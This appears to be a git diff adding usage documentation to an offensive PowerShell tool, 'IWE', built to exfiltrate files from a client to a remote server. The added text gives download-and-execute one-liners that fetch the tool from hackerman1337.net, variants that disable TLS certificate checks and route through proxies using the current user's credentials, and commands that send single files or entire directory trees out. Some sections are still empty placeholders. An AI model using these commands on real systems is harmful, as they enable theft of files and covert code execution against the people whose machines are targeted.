@@ -31,7 +31,13 @@ Exfiltrate files to a remote server in a secure, encrypted way
 - Loot folder structure
   - The tool keeps the identical folder structure as it exists on the client
 
+# ToDo:
+- I'm unhappy with the way SSL/HTTPS is done. Needs improvement
+- 
 
+
+# Limitations
+- Large files (100MB) should be split into chunks and then exfiltrated (see examples)
 
 # Help
 ```bash
@@ -65,6 +71,73 @@ pip install -r requirements.txt
 
 # Usage & Examples
 
-```powershell
-...
+```bash
+
+
 ```
+
+
+## Load `IWE` into PowerShell 
+
+HTTP
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://hackerman1337.net:8000/iwe')
+```
+
+HTTPS
+```powershell
+# Load via WebClient and certificate validation bypass. Does not work in pwsh.exe
+[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+IEX (New-Object Net.WebClient).DownloadString('https://hackerman1337.net/iwe')
+
+# Load via Invoke-WebRequest and certificate validation bypass 
+IWR 'https://hackerman1337.net/iwe' -SkipCertificateCheck | IEX
+```
+
+## Load `IWE` via proxy into PowerShell
+1. Use system or custom proxy
+2. Decide which proxy credentials to use (ignore if no authentication is needed)
+3. Decide if x509 certificate errors should be ingored
+```powershell
+# 1. User system proxy
+$proxy = [System.Net.WebRequest]::GetSystemWebProxy()
+# 1. User custom proxy
+$proxy = New-Object System.Net.WebProxy("http://yourProxy:8080")
+
+# 2. Use current user credentials for Kerberos / NTLM authentication
+$proxy.useDefaultCredentials = $true
+$proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
+# 2. Use custom credentials for proxy
+proxy.Credentials=Get-Credential
+
+# 3. Ignore certificate check (needed if self signed certificate is used)
+# Does not work in pwsh.exe, use powershell.exe!
+[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+$wc = new-object system.net.WebClient
+$wc.proxy = $proxy
+IEX $wc.DownloadString('https://hackerman1337.net:8000/iwe')
+```
+
+## Exfiltrate files
+
+```powershell
+# Exfiltrate single file
+IWE -File .\file.bin
+
+# Exfiltrate all files in current folder
+ls | IWE
+
+# Exfiltrate all files in curent dir starting with 
+ls file* | IWE
+
+# Exfiltrate all files and sub directories 
+ls -Recurse * | IWE
+```
+
+## Exfiltrate large files (split into chunks)
+Large files (>100MB) should be split into smaller chunks.
+```powershell
+tba.
+```
+
